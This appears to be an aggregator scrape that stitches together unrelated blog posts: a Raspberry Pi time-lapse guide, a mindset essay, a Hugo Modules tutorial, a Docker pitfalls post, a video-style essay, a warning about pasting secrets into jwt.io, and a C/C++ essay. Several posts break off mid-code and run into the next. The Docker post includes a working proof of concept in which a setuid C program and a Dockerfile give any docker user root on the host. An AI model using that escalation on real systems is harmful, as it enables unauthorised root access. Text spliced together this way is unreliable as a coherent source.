<li><a href="#raspberry-pi-time-lapse-repository">raspberry-pi-time-lapse repository</a></li>
</ul>
<h2>Preparation</h2>
<h3>Flash the Pi</h3>
<p>You'll need to flash Raspberry Pi OS on a fresh SD Card.</p>
<p>Either with <a href="https://www.balena.io/etcher/">Balena Etcher</a> or the official <a href="https://www.raspberrypi.org/downloads/">Raspberry Pi Imager</a>. The procedure is extremely straight forward.</p>
<p>Just go through the steps and you have Rasperry Pi OS installed on a SD card.</p>
<h3>Set up Wi-Fi connectivity</h3>
<p>To get the Pi connect to your Wi-Fi, you'll need to create a file called <code>wpa_supplicant.conf</code> in the SD card.</p>
<p>The contents of <code>wpa_supplicant.conf</code> should look like this (configure it accordingly):</p>
<pre><code>ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
ap_scan=1
update_config=1

network={
  scan_ssid=1
  ssid="YOUR_WIFI_ACCESS_POINT"
  psk="YOUR_WIFI_PASSWORD"
}
</code></pre>
<h3>Enable SSH access</h3>
<p>To enable SSH access (with the user <code>pi</code> and password <code>raspberry</code>), simply create an empty file (without extension), called <code>ssh</code> in the SD card.</p>
<h3>Enable Camera module</h3>
<p>To enable to camera module, you can configure it through the <code>raspi-config</code> utility.</p>
<p>But also with the file <code>config.txt</code> in SD card.</p>
<p>Open it and add the following to it:</p>
<pre><code>start_x=1
gpu_mem=128
</code></pre>
<p>Just make sure there are no other occurrencies for <code>start_x</code> or <code>gpu_mem</code></p>

<h2>Take image with raspistill</h2>
<blockquote>
<p><code>raspistill</code> is the command line tool for capturing still photographs with the camera module.</p>
</blockquote>
<p>The idea is to take a snapshot every x minutes using <code>raspistill</code></p>
<p>To take a single image, I'm using the following bash script called <code>/home/pi/take-snapshot</code>:</p>
<pre><code>#!/bin/bash

set -e

DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
SNAPSHOTS_DIR=/home/pi/snapshots
SNAPSHOT_PATH="$SNAPSHOTS_DIR/$DATE.jpg"
CURRENT_PATH="$SNAPSHOTS_DIR/current.jpg"

echo "$DATE"
mkdir -p "$SNAPSHOTS_DIR"
echo "taking snapshot $SNAPSHOT_PATH"
raspistill \
    --width 1280 \
    --height 960 \
    --quality 100 \
    --output "$SNAPSHOT_PATH"
echo "snapshot saved $SNAPSHOT_PATH"

echo "adding watermark $SNAPSHOT_PATH"
cd $SNAPSHOTS_DIR
montage \
  -label "$DATE" \
  $SNAPSHOT_PATH \
  -pointsize 30 \
  -gravity Center \
  -geometry +0+0 \
  $SNAPSHOT_PATH

cp $SNAPSHOT_PATH $CURRENT_PATH
</code></pre>
<p>This script will take a snapshot, name it in the format <code>%Y-%m-%dT%H:%M:%SZ.jpg</code> and put it in the folder <code>/home/pi/snapshots</code>.</p>
<p>At the end this photo is also watermarked using <code>montage</code> from the ImageMagick family.</p>
<h2>Schedule capture with crontab</h2>
<p>To take a photo every 5 minutes using the above script, you can set up a simple cron job for that.</p>
<p>Just run <code>crontab -e</code> to edit the cron schedules and add the following lines</p>
<pre><code>SHELL=/bin/bash
*/5 * * * * sh /home/pi/take-snapshot &gt;&gt; /home/pi/snapshots.log 2&gt;&amp;1
</code></pre>
<h2>Directory listing of snapshots</h2>
<p>You can expose a web server on port 80 to easily list all images (and time-lapses) taken in the folder <code>/home/pi/snapshots</code>.</p>
<p>Start the server at boot by adding the following to your crontab</p>
<pre><code>@reboot sudo python3 -m http.server --directory /home/pi/snapshots 80

<p>I&nbsp;was&nbsp;listening to a podcast the other day, and&nbsp;the hosts were talking about the scarcity&nbsp;mindset&nbsp;and how it sabotages people’s success.&nbsp;</p>



<p>Stephen Covey wrote in&nbsp;<em>The Seven&nbsp;</em><em>Habits of Highly Effective People</em>:&nbsp;</p>



<p><em>“Most people are deeply scripted in what I call the Scarcity Mentality. They see life as having only so much, as though there were only one pie out there. And if someone were to get a big piece of the pie, it would mean less for&nbsp;everyone else.”&nbsp;&nbsp;</em></p>



<p><br>It occurred to me that we can think this way about our tech skills. I bet you’ve worked with someone that rarely shares vital information (and maybe you do this too!)</p>



<p>Thinking that our knowledge is extremely precious and that there is a finite amount of know-how out there, we keep some (or all!) of the best to ourselves. In the Information Age, our expertise is what gives our position and status – so if someone has a scarcity mindset, they tend to be reluctant to give that away.&nbsp;</p>



<p>The thinking is, “if I give away all of the most valuable knowledge, then I will lose my advantage.”</p>



<p>But this equation is wrong. Giving knowledge away is not reducing your advantage. By sharing, you’ve established yourself as their expert – and it increases your stature with them!&nbsp;</p>



<p><strong>The scarcity mindset is a self-limiting behavior.&nbsp;</strong></p>



<p>The scarcity mindset ensures that you’ll get less from those around you. Your thoughts are keeping them from giving as freely to you because they know you’re holding back.&nbsp;</p>



<p>If you’re generous with your time and your knowledge, people will reciprocate. I’ve seen it happen time and time again.&nbsp;</p>



<p>Sharing is contagious – and having generosity embedded in your team’s culture boosts your effectiveness.&nbsp;</p>



<p><strong>The flip side of scarcity is abundance.</strong></p>



<p>Stephen continues,&nbsp;</p>



<p>“<em>The Abundance Mentality, on the other hand, flows out of a deep inner sense of personal worth and security. It is the paradigm that there is plenty out there and enough to spare for everybody. It results in sharing of prestige, of recognition, of profits, of decision making. It opens possibilities, options, alternatives, and creativity.”&nbsp;</em><br>An abundance mentality is what we should be striving for – there is more than enough for us all to have what we need!&nbsp;</p>



<p>Why should you share? Because THE ACT OF TEACHING strengthens your understanding, so you have even MORE knowledge than when you started!</p>



<p>I challenge you to share your knowledge this week. I know you’ll see dividends yourself as you build up those around you.</p>



<p>Best,</p>



<p>Ken</p>

September 2, 2020 | https://www.thenewdynamic.com/article/hugo-modules-everything-from-imports-to-create/ | <a href="https://web.archive.org/web/*/https://www.thenewdynamic.com/article/hugo-modules-everything-from-imports-to-create/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Back in July last year Hugo 0.56.0 introduced a powerful Module system. Pretty much like any package solution it allowed any Hugo project defined as a Module, be it a full website or a theme or a component to use any files stored on a repository somewhere and mount it as its own. It also enabled any Hugo project to become a full fledge Hugo Modules with its own config and dependencies which any other project could mount.</p><p>In this article, we’ll see how any Hugo project can use files stored on a distant repository and make them its own using the Module&nbsp;<strong>imports</strong>&nbsp;and&nbsp;<strong>mounts</strong>&nbsp;logic.</p><p>Then, we’ll dive into what exactly constitute a Hugo Module by creating our own!</p><h3 id="init-the-project-as-a-module">Init the project as a Module</h3><p>Before you can import a repository and use its files, your project will need to be initiated as a Hugo Module.</p><p>For this, you need to reference a repository.</p><p>We’ll assume your Hugo project already has a GitHub repo which lives at <code>https://github.com/me-me-me/my-repo</code></p><p>Using the terminal for your project root directory:</p><div><pre><code data-lang="bash">hugo mod init github.com/me-me-me/my-hugo-project
</code></pre></div><p>☝️ The above when successful will generate a file called <code>go.mod</code> at the root. It should look something like the following:</p><div><pre><code data-lang="go"><span>module</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>me</span><span>-</span><span>me</span><span>-</span><span>me</span><span>/</span><span>my</span><span>-</span><span>hugo</span><span>-</span><span>project</span>

<span>go</span> <span>1.14</span>
</code></pre></div><p>It will also have created a <code>go.sum</code> file. We won’t concern ourselves with that one.</p><h3 id="import-a-distant-repository">Import a distant repository</h3><p>For this very basic examples, we’ll try and incoporate the icons made available by the Bootstrap team through their repo at
<a href="https://github.com/twbs/icons" target="_blank" rel="noopener">https://github.com/twbs/icons</a>
.</p><p>Everything happens in your project <code>config.yaml</code> using the reserved <code>module</code> key and its <code>imports</code> array.</p><div><pre><code data-lang="yaml"><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>    </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/icons<span>
</span></code></pre></div><p>Now if you run <code>hugo</code> you will notice a new file has been dropped, <code>go.sum</code> but we won’t concern ourselves with it. On the other end, our <code>go.mod</code> file just got a new line.</p><div><pre><code data-lang="go"><span>module</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>me</span><span>-</span><span>me</span><span>-</span><span>me</span><span>/</span><span>my</span><span>-</span><span>hugo</span><span>-</span><span>project</span>

<span>go</span> <span>1.14</span>

<span>require</span> <span>github</span><span>.</span><span>com</span><span>/</span><span>twbs</span><span>/</span><span>icons</span> <span>v1</span><span>.0.0</span> <span>// indirect
</span></code></pre></div><p>That’s good but it does not tell Hugo what to do with those files.</p><p>With the <code>mounts</code> key, attached to our Bootstrap import, we’ll give Hugo more directions:</p><div><pre><code data-lang="yaml"><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>   </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/bootstrap<span>
</span><span>     </span><span>mounts</span><span>:</span><span>
</span><span>     </span>- <span>source</span><span>:</span><span> </span>icons<span>
</span><span>       </span><span>target</span><span>:</span><span> </span>assets/icons<span>
</span></code></pre></div><p>Mounts are unlimited but for now we just added one with the following settings:</p><ul><li><code>source</code> param points to the location of the mounted files in the distant repo. Here we’re pointing to the <code>icons</code> directory at the root of the repo.</li><li><code>target</code> param points to the location the files should be mounted into our Hugo’s union file system.</li></ul><p>With that mount in place, we will be able to access the icons svgs just like any other files in our project:</p><div><pre><code data-lang="go-html-template"><span>{{</span><span> </span><span>with</span><span> </span><span>resources</span><span>.Get</span><span> </span><span>"icons/cart.svg"</span><span> </span><span>}}</span>
  <span>&lt;</span><span>div</span> <span>class</span><span>=</span><span>"fill-current w-4"</span><span>&gt;</span>
    <span>{{</span><span> </span><span>.Content</span><span> </span><span>|</span><span> </span><span>safeHTML</span><span> </span><span>}}</span>
  <span>&lt;/</span><span>div</span><span>&gt;</span>
<span>{{</span><span> </span><span>end</span><span> </span><span>}}</span>
</code></pre></div><p>That’s it!</p><p>We can safely print this cart SVG without copying it to our project’s directory.</p><p>And in the off chance that this particular cart icon needs to be customized we can rely on Hugo’s union file system!</p><p>All we’d have to do is create an homonymous icon file in our project at <code>assets/icons/cart.svg</code> to have it being used in place of Bootstrap’s own cart icon.</p><p><strong>or…</strong></p><p>We could even go crazier and use the icon from another distant repo just for that cart icon… 🤩</p><div><pre><code data-lang="yaml">- <span>path</span><span>:</span><span> </span>github.com/refactoringui/heroicons<span>
</span><span>    </span><span>mounts</span><span>:</span><span>
</span><span>    </span>- <span>source</span><span>:</span><span> </span>src/solid/shopping-cart.svg<span>
</span><span>      </span><span>target</span><span>:</span><span> </span>assets/icons/cart.svg<span>
</span><span></span>- <span>path</span><span>:</span><span> </span>github.com/twbs/icons<span>
</span><span>	  </span><span>mounts</span><span>:</span><span>
</span><span>    </span>- <span>source</span><span>:</span><span> </span>icons<span>
</span><span>      </span><span>target</span><span>:</span><span> </span>assets/icons<span>
</span></code></pre></div><p>☝️ Here we are importing two repos, with their own <code>mounts</code> settings.</p><div><p>Note that regardless of the files mounted, Hugo will have to download the whole repository, so you might think twice before importing a 5MB repo for one of its svgs.</p></div><h3 id="upgrading">Upgrading</h3><p>What if the repo is updated? The default behaviour of Hugo Module is, on the first import, to grab the latest release, or if no release is found, the latest head on the default branch. That’s why Hugo wrote <code>v1.0.0</code> after the require directive.</p><p>If <code>github.com/twbs/icons</code> releases <code>v1.1.0</code> and you want that new release you can:</p><div><pre><code data-lang="bash">hugo mod get -u github.com/twbs/bootstrap
</code></pre></div><p>This should update your <code>go.mod</code> file with the latest release.</p><p>Now if you want a specific release rather than the latest, (we’ll use another repo for that example):</p><div><pre><code data-lang="bash">hugo mod get github.com/twbs/bootstrap@v3.4.0
</code></pre></div><p>If you want a specific commit, you’ll need to @ its long hash like so</p><div><pre><code data-lang="bash">hugo mod get github.com/twbs/bootstrap@394812b61d4dc80bfb2e090de925ae0dfc4cc29b
</code></pre></div><div><p>You should commit your <code>go.mod</code> and <code>go.sum</code> file of course, so that everybody working on the project uses the same versions!</p></div><h2 id="create-a-hugo-module">Create a Hugo Module</h2><p>The above was interesting as we covered how we can import any repo out there and make its files part of our project. But the real power comes from using full fledge Hugo Modules as they alone can sport template files, asset files, data files, even <strong>content</strong> files!</p><p>And what better way to learn about them than by creating our own!</p><p>For the sake of the example, we’ll create our own Icon Module. It will:</p><ol><li>Import some SVG files from a distant repo</li><li>Create a page listing all available icons on the site.</li><li>Load its own <code>icon</code> partial which will ease up the printing of any icon on the project.</li></ol><p>First we’ll create a directory on our local machine. We’ll give it a poor but short name: <code>hugo-icons</code>.</p><h3 id="1-imports">1. Imports</h3><p>The first thing we need is a <code>config.yaml</code> file for our Module to register its imports.</p><p>Yes, any Hugo project, be it a website or a theme or a component can import other Modules or repo. The import tree is infinite. As we already mentioned, it’s a real dependency solution!</p><p>Our imports and mounts settings will be very similar to what we did before. We’ll just mount the files in a reserved directory to make sure we don’t have file conflicts with other modules.</p><div><pre><code data-lang="yaml"><span># config.yaml</span><span>
</span><span></span><span>module</span><span>:</span><span>
</span><span>  </span><span>imports</span><span>:</span><span>
</span><span>   </span>- <span>path</span><span>:</span><span> </span>github.com/twbs/bootstrap<span>
</span><span>     </span><span>mounts</span><span>:</span><span>
</span><span>	   </span>- <span>source</span><span>:</span><span> </span>icons<span>
</span><span>	     </span><span>target</span><span>:</span><span> </span>assets/hugo-icons/icons<span>
</span></code></pre></div><h3 id="2-creating-the-listing-page">2. Creating the listing page</h3><p>We’ll need two things for that.</p><ol><li>A content files to be mounted on the project.</li><li>A template file for Hugo to render that content file as a page.</li></ol><p>Thanks to the <code>mounts</code> settings, those files don’t have to follow the usual directory structure of a Hugo project. They can live anywhere which makes sense in the context of our componentized module.</p><p>We’ll go crazy and add</p><ul><li><code>page/layout.html</code></li><li><code>page/content.md</code></li></ul><p>Getting back to our updated <code>config.yaml</code> , you’ll note that the <code>mounts</code> settings we are dealing with sit at the root of the <code>module</code> map.</p><p>That’s because mounting is not reserved to imports. You can assign mounting settings to the project at hand with its own <code>mounts</code> key.</p><div><pre><code data-lang="yaml"><span># config.yaml</span><span>
</span><span></span><span>module</span><span>:</span><span>

This way we won’t collide with another module having its own <code>icon</code> partial.</p><p>And our very basic partial:</p><div><pre><code data-lang="text">{{/*

<p>The ability to isolate a given program along with its dependencies has long held the promise of promoting separation of concerns, avoiding conflicts and improving security and deployments.</p>
<p>Docker, in particular, with its large ecosystem and ease of use makes prototyping extremely easy. In fact, you'd be hard-pressed to find a technical post on this site that doesn't also include docker instructions for readers to try the examples for themselves.</p>
<p>That said, despite years of use and improvements there are still surprises and unexpected gotchas that can easily catch people off guard.</p>
<h3>1. Docker Bypasses UFW Firewall Rules</h3>
<p>Out of the box, if you run docker containers on a system protected by the ufw firewall (Ubuntu/Debian/etc), <b>any ports published by a container will bypass ufw rules on the host.</b> This was noticed back in at least <a href="https://www.mkubaczyk.com/2017/09/05/force-docker-not-bypass-ufw-rules-ubuntu-16-04/">2017</a>, and <a href="https://github.com/docker/for-linux/issues/777">is</a> <a href="https://www.techrepublic.com/article/how-to-fix-the-docker-and-ufw-security-flaw/">still</a> <a href="https://stackoverflow.com/a/51741599">a</a> <a href="https://github.com/docker/for-linux/issues/690">problem</a> in 2020.</p>
<p>As a practical example, say you have ufw configured to block all incoming traffic except for SSH. If you then start up a test mysql container and include the -p option so that you can connect to it afterwards, ie :</p>
<pre>docker run --name mysql1 -e MYSQL_ROOT_PASSWORD=password -p 3306:3306 -d mysql:latest
</pre>
<p>Congrats, your new, insecure mysql container is now available to everyone on the network who wants to connect to it, bypassing your otherwise strict ufw rules.</p>
<p>There are workarounds that approach the issue from different angles, from explicitly publishing ports to localhost to disabling dockerd from manipulating iptables, but this is one of the most concerning default behaviors that can expose unprotected services to remote abuse.</p>
<h3>2. Leaky Permission Boundaries</h3>
<p><b>If you've given a user the ability to run docker containers on a host, you've given them the ability to <u>become root on that host.</u></b> This is due to dockerd's default mapping of userids between the container and host. Below is a small proof-of-concept:</p>
<pre>become_root.c
-------------

   #include &lt;stdlib.h&gt;
   #include &lt;unistd.h&gt;

   int main(){
     setuid(0);
     system("/usr/bin/whoami");
     return 0;
   }

$ gcc become_root.c -o become_root

$ ./become_root
   ben

prepare.sh
----------
   #!/bin/sh
   cp /become_root /opt/become_root_setuid
   chmod 4755 /opt/become_root_setuid

Dockerfile
----------
   FROM busybox
   COPY prepare.sh  become_root /
   CMD ["/prepare.sh"]

$ docker build --tag setuid .
$ docker run --rm --name test1 --volume "$PWD":/opt setuid

$ ls -l become_root*
   -rw-r--r-- 1 ben  ben    115 Aug 31 22:52 become_root.c       &lt;--- source code
   -rwxr-xr-x 1 ben  ben  16664 Sep  1 09:18 become_root         &lt;--- original program
   -rwsr-xr-x 1 root root 16664 Sep  1 09:33 become_root_setuid  &lt;--- program copy with setuid root

$ ./become_root_setuid
   root
</pre>
<p>Above the beome_root program attempts to setuid to 0 (root) and then run `whoami` to display the effective userid. Running it locally does not give the user root access since the file is owned by user 'ben' (the setuid bit is also not set but this is irrelevant since setuid runs the program as the file owner, ie 'ben').</p>
<p>To get around this, the program and a small script were added to a minimal docker image in order to copy the become_root program to a shared volume specified at runtime and set the setuid bit. Since dockerd (by default) mirrors the userids from the container to the host for volume I/O, the file is written <u>as root</u> and now has the setuid bit set. This sequence effectively allows any user with the permissions to run a docker container to also create arbitrary programs that will run as root on the host system.</p>
<p>There are efforts to address this such as <a href="https://docs.docker.com/engine/security/rootless/">Rootless mode</a>, however even ignoring its current experimental status, it needs to be explicitly configured and introduces limitations which may not be feasible in your environment.</p>
<h3>3. Dockerized Applications Run As Root</h3>
<p>Minimizing the number of processes running as root has been an accepted best-practice for a very, very long time. The general idea being that even if a process is successfully compromised, its "blast radius" is confined only to the resources it has access to.</p>
<p>However, without explicitly configuring a Dockerfile to switch to a different user, all dockerized applications will run as root. The American Express Team has a <a href="https://americanexpress.io/do-not-run-dockerized-applications-as-root/">good write-up</a> worth reading if you're unfamiliar with the risk this introduces even when running applications in a containerized environment.</p>
<h3>4. Programs Consisting of Multiple Processes</h3>
<p>Docker excels when working with a single process, however as noted in <a href="https://docs.docker.com/engine/faq/#how-do-i-run-more-than-one-process-in-a-docker-container">the official FAQ</a>, dockerizing programs that consist of multiple processes, though possible, isn't really the best fit with how docker is designed to work.</p>
<p>Postfix is a good example where separation of <a href="http://www.postfix.org/OVERVIEW.html">specific-purpose processes</a> has been central to its operation and security model. (It should be noted that there have been <a href="http://www.postfix.org/announcements/postfix-3.3.0.html">recent changes</a> to ease Postfix's use in container environments, but even with these changes there are still <a href="https://stackoverflow.com/questions/49495679/dockerizing-postfix-relay-server">additional</a> <a href="https://serverfault.com/questions/885828/is-there-any-way-to-run-postfix-in-foreground#comment1209656_916072">aspects</a> to consider).</p>
<h3>5. Docker Compose YAML V2 vs V3</h3>
<p>Its almost inevitable that you will run across a mix of V2 and V3 docker-compose.yml examples in the wild and wonder what the difference is and which version should you be using.</p>
<p>There is a brief history and overview written in <a href="https://github.com/docker/docker.github.io/pull/7593">this PR</a> as well as the <a href="https://docs.docker.com/compose/compose-file/compose-versioning/">official documentation</a>, but the TL;DR is that there were structural and directive changes made for the V3 format mainly to support running in Docker Swarm that do not typically apply to the most common docker use-cases. As of this writing you can still use either compose format without issue, however I will note that Docker (the company) recommends V3.</p>
<h3>6. Limitations Of Dependency Support In Docker Compose</h3>
<p>Another surprise when working with docker-compose comes when trying to establish container dependencies. For example, you wouldn't want your webapp container to start until the backend container it relies on is up and ready to receive connections. Since docker-compose's primary purpose is to define related groups of containers, there is a "<a href="https://docs.docker.com/compose/compose-file/#depends_on">depends_on</a>" directive that allows you to define such relationships, but its actual operation leaves much to be desired.</p>
<p>"depends_on" does indeed take dependencies into consideration when starting containers up and shutting them down. However docker-compose only checks if a container's process <u>has started</u> before launching dependent containers, not if it has begun listening on a port or is in any other kind of "ready" state. This results in firing up each container immediately after each other, providing very little dependency-aware value.</p>
<p>The official documentation <a href="https://docs.docker.com/compose/startup-order/">tries to justify</a> this limitation, but frankly it comes off as a bit of a cop out. Yes, determining a "ready" state may differ from one application to the next, but there are a handful of established methods that will cover the vast majority of use-cases.</p>
<p>Instead, end-users are forced to rely on ugly hacks to workaround this limitation. You can see one such workaround in <a href="https://bhoey.com/blog/high-availability-rabbitmq-with-mirrored-queues/">my RabbitMQ HA post's</a> docker-compose.yml where an additional sleep interval was required to avoid a race condition when the RabbitMQ brokers start up. Alternatively there are numerous "wait-for..." scripts and docker images of varying quality available that aim to provide the functionality missing in the core program.</p>
<p>It looks like there was <a href="https://github.com/docker/compose/issues/3754">some work</a> done in the past to integrate health checks with depends_on, however since V3 no longer supports conditional form of depends_on this doesn't appear to be a viable option.</p>
<h3>Final Thoughts</h3>
<p>As the containerization landscape continues to mature I look forward to improvements both in shipped defaults and in people's awareness of risks and trade-offs involved with different configurations.</p>
<p>Hopefully this post brought to light something that you weren't aware of before and can help better prepare you for improved container management in the future. As always, good luck and happy coding!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The production quality of <a href="https://www.youtube.com/c/mkbhd">Marques Brownlee videos</a> is stellar and Marques has developed through the years an incredible talent for visual storytelling.</p>
<p>But I'd like to get more into some of the specific reasons why I believe we love his videos. I'm a technologist, writer, and storyteller, so these things are often on my mind.</p>
<h2>No unnecessary camera movements</h2>
<p>Many people might confuse more camera movements as better storytelling, but 99% of the time it's the exact opposite. Think about how intentional David Fincher is with where he places the camera, and if it will move or won't. One emblematic example: in Gone Girl there's a single hand-held shot (can't find it on YouTube, but it's Ben Affleck running from journalist and other people).</p>
<p>Marques does the same, and most of the time <strong>if the camera moves, there's a reason</strong>.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/a51599f1-c1d1-4d39-a87a-87661866aae4.jpeg"></p>
<h2>Color balance</h2>
<p>Color is great, and it's a powerful storytelling tool. Just like camera movements though, too much color, or too many colors, can be distracting and overwhelming.</p>
<p>Usually, colors in Marques videos are extremely consistent, and never unnecessarily flashy.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/ffca8a76-ddc9-493f-81f5-d9bf1cd542b3.jpeg"></p>
<h2>Straight to the point</h2>
<p>After a 4 seconds intro, and sometimes a few beautiful shots of the topic of the video, Marques goes straight to the point and doesn't waste any of your time.</p>
<h2>Authenticity</h2>
<p>I don't know how you feel, but for me watching MKBHD feels like being with a techie friend who genuinely wants to tell me about some tech that is new and exciting.</p>
<p>It doesn't feel like marketing, it doesn't feel like overthinking or bullshit, it genuinely feels like someone saying <em>hey check this out</em>.</p>
<p>We've bombarded daily by content of any kind, and so much of it feels useless or fake that <strong>we crave authenticity.</strong></p>
<p>Marques gets it, it doesn't matter how many millions are in his bank account.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/2e1c40b9-c89d-4857-9de1-ad88084dd35c.jpeg"></p>
<h2>Simmetry and composition</h2>
<p>Finally, it's worth mentioning how precise, symmetric and pleasing to watch are Marques shots. They almost have a calming effect, and you can feel how intentional he is when placing objects for the camera.</p>
<p><img src="https://fabriziorinaldi.com/images/blog/e83ee697-72ff-4aaf-9e91-2e466c194def.jpeg"></p>
<p>Do you think there are other core reasons we love his videos? Let me know <a href="https://twitter.com/linuz90">on Twitter</a>.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Something my colleagues know well is how little I trust online tools like <a href="https://jwt.io/">jwt.io</a>, online JSON validators or online tooling in general, but it also bleeds into <a href="https://www.jvt.me/mf2/2020/08/zebqf/">comments I make online</a> and in my blog posts, too, and I thought I'd share a little bit of a reason as to why.</p><p>Instead of using an online service, I will reach for a way to run it locally, using whichever programming language toolchain I have available. But why? Why wouldn't I recommend something like jwt.io? Or an online JSON validator, especially if they boast client-side functionality, and mean I don't need things installed?</p><p>Let's start with a bit of background. Firstly, I'd just like to caveat this all with the note that <strong>I have no access to Production data, customer or otherwise</strong>. All of these examples are referencing Non-Production examples.</p><p>I also want to caveat this with the fact that this is <strong>not a personal attack</strong> on jwt.io. I am using them as an example as they're a well-known and well-used service, and I've seen issues with it before. Auth0 run it, and are probably one of the few companies we'd want to be running it. It's also <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io">Open Source</a> <em>but</em> one of the great difficulties of Web-hosted services are that we have no idea if the source code that we're told is being used is actually being used!</p><p>I'm currently working on the Open Banking platform for Capital One. We're fortunate to have very restricted access to Production, which makes things safer for everyone. One thing we strive to do is to treat Non-Production secrets like Production ones where possible - where we shouldn't have access to them at all, and shouldn't be sharing them with external services. Some of these Non-Production secrets may be usable outside of Capital One, for instance Open Banking Sandbox signing certificates.</p><p>We perform a fair bit of testing in our Non-Production environments and sometimes need to debug things, such as what's inside a JWT (as Open Banking introduces several places they're used). I've been burned a number of times by folks putting a Non-Production JWT or an Open Banking Sandbox certificate into jwt.io. Although Non-Production, these are sensitive in of themselves, as they have implementation details for our services, and as mentioned, certain things could be used outside of Capital One.</p><p>The biggest reason I hear from folks using online tooling is that it's easier, and that they'd rather do that than find out how to run it locally. I disagree with this, but am quite biased, as I often have a blog post for many of these common issues. I love sharing my blog with others and having a handy solution, or if I don't have an answer to a problem, I'll find out how and <a href="https://www.jvt.me/tags/blogumentation/">blogument it for later</a>. So I see that reaching for online tooling is more just because we've got folks who aren't aware of how they could do otherwise.</p><p>One great thing about removing the need for an online tool is that you can self-serve it once you have the tools locally. You can run it locally when you've got no internet (which isn't as much of an issue in these Coronavirus times) but also regardless of whether the upstream service is broken. You can use it with other i.e. command-line tooling, for instance how I've set up <a href="https://gitlab.com/jamietanna/dotfiles-arch/-/blob/master/terminal/home/bin/unpack">this command-line script</a> to handle a lot of common data formats I deal with and unpack them to a human-readable format.</p><p>But most importantly, by telling people to put sensitive data (such as credentials, configuration files, etc) it's a really dangerous lesson for our teams. We're teaching people to blindly trust arbitrary websites that they don't have any relationship with, nor have fully audited the source code, when posting potentially sensitive data.</p><p>I realise this may not be something you do when running it locally, but it's less likely for a well-known library running locally to need to reach outbound.</p><p>jwt.io is an interesting example, because although it boasts that it runs as a client-side solution, you may not have been aware that <a href="https://github.com/jsonwebtoken/jsonwebtoken.github.io/commit/b362ab19a9f37e337b5f8ea38987aa680aa6e0a9">until last September</a>, there were metrics being determined which although may have seemed innocent, show that it's easy for other functionality to be hidden in a seemingly client-side-only website. Unless you audit everything, every time, you're in a risky position where you may be leaking data you're not expecting to.</p><p>I feel that we can do something to help services that handle potentially sensitive data with helping educate the user that they should be more careful, because jwt.io's warning definitely doesn't help with folks who don't fully appreciate what the risk is if jwt.io isn't actually as trustworthy as the user thinks:</p><blockquote><p>Warning: JWTs are credentials, which can grant access to resources. Be careful where you paste them! We do not record tokens, all validation and debugging is done on the client side.</p></blockquote><p>What do you think? Am I maybe being a little too sensitive? Am I not being sensitive enough?</p><p>Edit: Based on some conversations being had in response to the post, I thought it'd mention I've written about how to <a href="https://www.jvt.me/posts/2019/06/13/pretty-printing-jwt-openssl/">pretty-print a JWT locally with OpenSSL</a> and <a href="https://www.jvt.me/posts/2018/08/31/pretty-printing-jwt-ruby/">a Ruby alternative</a>.</p></div></div>]]>

<![CDATA[The problem with C compatibility in C++]]>
            </title>

September 2, 2020 | https://cor3ntin.github.io/posts/c/ | <a href="https://web.archive.org/web/*/https://cor3ntin.github.io/posts/c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://cor3ntin.github.io/posts/c/fight.jpeg" alt="Fish"></p>
<p>In the early 70s, C was created at Bell Labs as a byproduct of the development of UNIX.
It quickly became one of the most popular programming languages.
But it was not expressive enough for Bjarne Stroustrup.
And so, in 1983, as a byproduct of his Ph.D. thesis, he extended C.</p>
<p>C with classes was born.</p>
<p>At the time, Bjarne Stroustrup understood that a programming language has many components,
not only the language, its compiler, but also a linker and libraries.
Offering a familiar tool also makes adoption easier.
In this historical context, it makes sense that C++ would be based on C.</p>
<p>Fast-forward 40 years later.</p>
<p>Both C and C++ are widely used in the industry.
But go 5 minutes on the Internet and C developers will tell you that C++ is the most horrific man-made creation,
while many C++ developers wait for the day when C finally burns in the hot flames of hell.</p>
<h2 id="so-what-happened">So what happened?</h2>
<p>On the surface, C and C++ cater to the same use cases: high performance, deterministic, native but portable code for the widest range of hardware and applications.</p>
<p>But C is proudly a low-level language. A nicer assembly.</p>
<p>From day one, C++ had magic. Dark witchcraft: destructors. Suddenly the compiler was doing things on its own.
It also had type inference very early on, but the developers of the mid-80s were not quite ready for that and Bjarne Stroustrup
was pressured into removing <code>auto</code>, until it was added back to C++11.</p>
<p>From then, C++ got more and more tools to build abstractions.
I don’t think it would be fair to say that C++ is a low-level or high-level language. It’s both, by design.
But building high-level abstractions while not sacrificing performance is hard.
C++ then needed tools to achieve that: <code>constexpr</code>, move semantics, templates, and an ever-growing standard library.</p>
<p>Fundamentally I think C trusts developers while C++ trusts compilers.
This is a massive difference that sharing the same native types or syntax for while loop cannot hide.</p>
<p>C++ developers blame C for all their lost limbs, while C developers probably think C++ is batshit crazy.
I imagine that is a fair perspective if you look at C++ through a C lense. C++ is pretty wild <em>as a superset of C</em>.
A seasoned C person looking at C++ expecting familiarity in C++ will not find it. C++ is not C.
This is enough to feed flamewars for generations.</p>
<p>But as much as I dislike C, I don’t have any legitimacy to make fun of it. See, I have some experience with C++ but I
wrote very little C. It was probably bad C.
A language is also its good practices, patterns, idioms, and these take years to learn. If you try to write C code like it’s C++ or C++ like it is C, you will have a bad time.
Knowing <a href="https://www.youtube.com/watch?v=YnWhqhNdYyk">C doesn’t teach you C++</a>. Knowing C++ does not teach you C.</p>
<p>So can we all stop saying C/C++, regret the unfortunate naming, and sing kumbaya in harmony?
Not so fast.</p>
<p>See, despite being philosophically different from C, C++ is still somewhat a superset of C.
That is to say, you can include a C header in a C++ translation unit and that should compile.
And this is where it gets messy.</p>
<p>C++ is not an extension of C.
It is designed as a separate standard, by a different committee, different people.
